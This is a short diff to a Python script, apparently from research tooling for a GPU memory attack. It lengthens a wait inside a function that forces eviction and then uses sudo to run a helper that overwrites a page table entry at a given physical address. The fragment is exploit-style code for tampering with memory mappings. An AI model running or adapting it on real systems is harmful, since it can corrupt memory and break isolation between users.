@@ -43,7 +43,7 @@ def launch_eviction(cmd, pte_pa, pte_val, sleep_time=8):
     a_out = subprocess.Popen(cmd)
     b_out = subprocess.Popen(["nvidia-smi", "-f", "/dev/null"])
     b_out.wait() # in case the driver warms up very slowly
-    time.sleep(1)
+    time.sleep(2)
     subprocess.Popen(["sudo", modifier_path, hex(pte_pa), hex(pte_val)])
     print("[*] modification done")
     for i in range(sleep_time):
